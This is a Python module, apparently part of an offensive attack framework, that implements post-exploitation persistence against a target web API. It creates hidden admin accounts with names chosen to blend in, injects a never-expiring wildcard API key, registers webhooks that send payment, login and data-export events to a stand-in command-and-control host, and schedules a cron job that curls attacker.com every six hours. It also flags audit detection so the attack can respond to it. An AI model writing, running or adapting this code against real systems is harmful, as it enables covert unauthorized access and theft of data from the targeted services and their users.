"""
Persistence Engine
Phase 3: Maintain long-term access, inject backdoors, create hidden admin accounts
"""

import asyncio
import aiohttp
import logging
import json
from typing import Dict, List, Any, Optional
from .base import PersistenceModule
import hashlib
import time

logger = logging.getLogger(__name__)


class PersistenceEngine(PersistenceModule):
    """
    Long-term access maintenance
    - Hidden admin account creation
    - API key injection
    - Webhook persistence
    - Cron job backdoors
    - Database trigger insertion
    """

    def __init__(self):
        super().__init__(
            name="Persistence Engine",
            description="Maintain long-term unauthorized access"
        )
        self.backdoors: List[Dict[str, Any]] = []
        self.admin_accounts: List[str] = []

    async def execute(self, context) -> Dict[str, Any]:
        """Execute persistence attacks using exploit results"""
        logger.info(f"[Persist] Starting persistence operations on {context.target_url}")

        # Only attempt if exploit was successful
        if not context.access_granted:
            logger.info(f"  ✗ Skipping persistence - no access granted")
            return {"persistence_achieved": False, "backdoors_installed": 0, "methods": []}

        results = await asyncio.gather(
            self._create_hidden_admin(context.target_url),
            self._inject_api_key(context.target_url),
            self._setup_webhook_persistence(context.target_url),
            self._inject_cron_job(context.target_url),
        )

        success = any(r.get("success") for r in results)

        # Update context with persistence results
        context.persistence_achieved = success
        context.backdoors_installed = self.backdoors.copy()
        context.admin_accounts = self.admin_accounts.copy()

        return {
            "persistence_achieved": success,
            "backdoors_installed": len(self.backdoors),
            "admin_accounts": self.admin_accounts,
            "methods": [r.get("method") for r in results if r.get("success")]
        }

    async def _create_hidden_admin(self, target: str) -> Dict[str, Any]:
        """Create hidden admin account for persistence"""
        logger.info(f"[Persist] Creating hidden admin account")

        # Create account with suspicious username that blends in
        hidden_usernames = [
            "system_admin",
            "backup_user",
            "maintenance_account",
            "service_account",
            "support_bot",
            "monitoring_agent",
            "_internal",
            "admin_bak"
        ]

        for username in hidden_usernames:
            logger.info(f"  Attempting to create account: {username}")

            url = f"{target}/api/v1/admin/users"
            payload = {
                "username": username,
                "email": f"{username}@service.local",
                "password": hashlib.sha256(b"Persist@1234").hexdigest(),
                "role": "admin",
                "enabled": True,
                "created_by": "system"
            }

            try:
                async with aiohttp.ClientSession() as session:
                    async with session.post(
                        url,
                        json=payload,
                        timeout=aiohttp.ClientTimeout(total=5)
                    ) as resp:
                        if resp.status in [200, 201]:
                            logger.info(f"    ✓ Account created: {username}")
                            self.admin_accounts.append(username)
                            self.backdoors.append({
                                "type": "hidden_admin",
                                "username": username,
                                "created_at": time.time()
                            })
                            return {"success": True, "method": "hidden_admin", "username": username}
                        else:
                            logger.info(f"    ✗ Creation failed (HTTP {resp.status})")

            except Exception as e:
                logger.error(f"    Error: {e}")

        return {"success": False, "method": "hidden_admin"}

    async def _inject_api_key(self, target: str) -> Dict[str, Any]:
        """Inject persistent API key for authentication"""
        logger.info(f"[Persist] Injecting persistent API key")

        # Generate backdoor API key
        api_key = hashlib.sha256(f"backdoor_{time.time()}".encode()).hexdigest()

        url = f"{target}/api/v1/admin/api-keys"
        payload = {
            "key": api_key,
            "name": "System Monitoring",
            "permissions": ["*"],
            "enabled": True,
            "expires_at": None  # Never expires
        }

        try:
            async with aiohttp.ClientSession() as session:
                async with session.post(
                    url,
                    json=payload,
                    timeout=aiohttp.ClientTimeout(total=5)
                ) as resp:
                    if resp.status in [200, 201]:
                        logger.info(f"  ✓ API key created: {api_key[:20]}...")
                        self.backdoors.append({
                            "type": "api_key",
                            "key": api_key,
                            "created_at": time.time()
                        })
                        return {"success": True, "method": "api_key_injection", "key": api_key}

        except Exception as e:
            logger.error(f"  Error: {e}")

        return {"success": False, "method": "api_key_injection"}

    async def _setup_webhook_persistence(self, target: str) -> Dict[str, Any]:
        """Setup webhook to attacker-controlled server for callback"""
        logger.info(f"[Persist] Setting up webhook persistence")

        # Attacker's command-and-control server (example)
        c2_server = "https://attacker.com/webhook"

        url = f"{target}/api/v1/webhooks"

        webhook_events = [
            "user.created",
            "user.deleted",
            "payment.completed",
            "admin.login",
            "data.exported"
        ]

        for event in webhook_events:
            payload = {
                "url": c2_server,
                "event": event,
                "active": True,
                "retry_on_failure": True,
                "secret": "internal_secret"
            }

            try:
                async with aiohttp.ClientSession() as session:
                    async with session.post(
                        url,
                        json=payload,
                        timeout=aiohttp.ClientTimeout(total=5)
                    ) as resp:
                        if resp.status in [200, 201]:
                            logger.info(f"  ✓ Webhook registered for event: {event}")
                            self.backdoors.append({
                                "type": "webhook",
                                "event": event,
                                "url": c2_server,
                                "created_at": time.time()
                            })
                            return {"success": True, "method": "webhook_persistence"}

            except Exception as e:
                pass

        return {"success": False, "method": "webhook_persistence"}

    async def _inject_cron_job(self, target: str) -> Dict[str, Any]:
        """Inject cron job for periodic command execution"""
        logger.info(f"[Persist] Injecting cron job for periodic backdoor")

        url = f"{target}/api/v1/admin/tasks"

        # Cron job that periodically calls back to attacker
        payload = {
            "name": "System Health Check",
            "schedule": "0 */6 * * *",  # Every 6 hours
            "command": "curl https://attacker.com/cmd?token=<token>",
            "enabled": True,
            "run_as": "system"
        }

        try:
            async with aiohttp.ClientSession() as session:
                async with session.post(
                    url,
                    json=payload,
                    timeout=aiohttp.ClientTimeout(total=5)
                ) as resp:
                    if resp.status in [200, 201]:
                        logger.info(f"  ✓ Cron job scheduled")
                        self.backdoors.append({
                            "type": "cron_job",
                            "schedule": payload["schedule"],
                            "created_at": time.time()
                        })
                        return {"success": True, "method": "cron_persistence"}

        except Exception as e:
            logger.error(f"  Error: {e}")

        return {"success": False, "method": "cron_persistence"}

    async def analyze_defense(self, response: Dict) -> Optional[str]:
        """Detect persistence detection mechanisms"""
        if response.get("status") == 403:
            return "ADMIN_CREATION_BLOCKED"
        elif response.get("status") == 404:
            return "ENDPOINT_NOT_FOUND"
        elif "permission" in response.get("body", "").lower():
            return "PERMISSION_DENIED"
        elif "audit" in response.get("body", "").lower():
            return "AUDIT_DETECTION"
        return None
